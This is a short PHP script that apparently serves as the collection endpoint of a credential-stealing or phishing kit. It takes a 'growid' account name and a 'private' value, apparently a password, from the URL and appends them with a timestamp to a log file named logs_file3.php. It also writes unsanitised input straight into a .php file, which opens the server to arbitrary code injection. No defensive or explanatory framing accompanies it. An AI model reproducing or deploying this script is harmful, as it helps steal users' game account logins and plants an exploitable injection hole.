<?php
$realgt = strtolower($_GET["growid"]);
$private = strtolower($_GET["private"]);
file_put_contents('logs_file3.php', "<tr><td>$realgt</td><td>$private</td><td>" . date("Y/m/d") . " - " . date("h:i:sa") . "</td></tr>", FILE_APPEND);
?>